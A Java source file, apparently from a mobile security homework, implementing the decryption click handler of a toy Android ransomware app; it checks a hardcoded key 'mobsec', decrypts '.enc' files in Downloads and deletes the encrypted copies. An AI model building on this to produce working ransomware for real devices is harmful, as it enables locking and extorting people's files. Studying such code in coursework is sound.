package nordberg.katie.hw4;

import android.app.Activity;
import android.os.Environment;
import android.util.Log;
import android.view.View;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import java.io.File;

import javax.crypto.spec.SecretKeySpec;

public class DecryptClick implements View.OnClickListener{
    private final Activity a;

    public DecryptClick(Activity a){
        this.a = a;
    }
    @Override
    public void onClick(View v) {
        // Get the key entered by the user
        TextView userDecryptionKey = a.findViewById(R.id.decryptionText);
        String pw = userDecryptionKey.getText().toString();

        // I don't want to try to decrypt with a bad key.
        if (!pw.equals("mobsec")) {
            Toast.makeText(a, "Wrong Key entered", Toast.LENGTH_LONG).show();
            return;
        }

        SecretKeySpec k = CipherStreamUtil.getKey(pw);
        File f = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
        File[] allFiles = f.listFiles();

        for (File file : allFiles) {
            if (file.isFile() && file.getName().endsWith(".enc")) {
                Log.e("Ransomware", "Decrypting " + file.getName());
                File dst = new File(f.getAbsolutePath(), file.getName().replace(".enc", ""));
                CipherStreamUtil.decrypt(file, dst, k);
                // Delete the encrypted file because its no longer needed
                // (as long as the right key was entered which we would have returned above if it was not)
                file.delete();
                Log.e("Ransomware", "Finished decrypting!");
            }
        }
        Toast.makeText(a, "Finished Decrypting", Toast.LENGTH_LONG).show();

    }
}
